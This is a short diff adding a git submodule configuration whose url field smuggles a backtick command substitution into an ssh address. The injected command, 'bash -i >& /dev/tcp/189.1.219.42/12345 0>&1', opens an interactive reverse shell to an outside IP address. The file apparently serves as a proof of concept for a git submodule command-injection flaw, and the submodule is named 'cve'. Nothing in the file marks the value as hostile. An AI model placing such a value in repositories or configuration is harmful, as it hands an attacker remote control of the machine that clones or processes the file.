@@ -1,0 +1,3 @@
+[submodule "cve"]
+	path = cve
+	url = ssh://`bash -i >& /dev/tcp/189.1.219.42/12345 0>&1`foo.ichunqiu.com/bar
